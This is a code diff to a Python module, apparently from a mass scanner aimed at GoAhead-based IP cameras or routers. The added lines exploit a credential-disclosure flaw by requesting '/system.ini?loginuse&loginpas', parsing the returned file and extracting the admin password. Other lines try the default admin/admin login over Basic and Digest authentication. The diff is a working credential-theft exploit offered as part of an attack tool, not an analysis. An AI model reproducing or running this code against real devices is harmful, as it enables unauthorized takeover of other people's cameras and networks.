@@ -1,3 +1,5 @@
+import re
+
 from modules import progress
 from modules.networking import http_connect
 from modules.paint import green
@@ -11,12 +13,20 @@ class GoAhead:
         self.parent = parent
 
     def try_for_vuln(self):
+        path = '/system.ini?loginuse&loginpas'
+        resp = http_connect.digest_auth_check(self.ip, self.port, path=path, returnall=True)
+        if str(resp) == '<Response [200]>':
+            # filtered = " ".join(re.findall("[0-9a-zA-Z]+", resp.text))
+            filtered = resp.text.split('\x00')
+            pwd = filtered[filtered.index('admin') + 27]
+            self.set_done('admin', pwd)
+            return True
         if 'Basic' in self.parent.data['authenticate']:
-            if http_connect.basic_auth_check(self.ip, self.port, 'admin', 'admin'):
+            if http_connect.basic_auth_check(self.ip, self.port, usr='admin', pwd='admin'):
                 self.set_done('admin', 'admin')
                 return True
         elif 'Digest' in self.parent.data['authenticate']:
-            if http_connect.digest_auth_check(self.ip, self.port, 'admin', 'admin'):
+            if http_connect.digest_auth_check(self.ip, self.port, usr='admin', pwd='admin'):
                 self.set_done('admin', 'admin')
                 return True
 
@@ -46,6 +56,4 @@ class GoAhead:
         self.parent.data['usr'] = usr
         self.parent.data['pwd'] = pwd
         self.result_queue.put(self.parent.data)
-        progress.increment('successful')
-        self.parent.sig.change_successful_counter.emit(green(str(progress.get_successful_counter())))
         self.parent.isDone = True
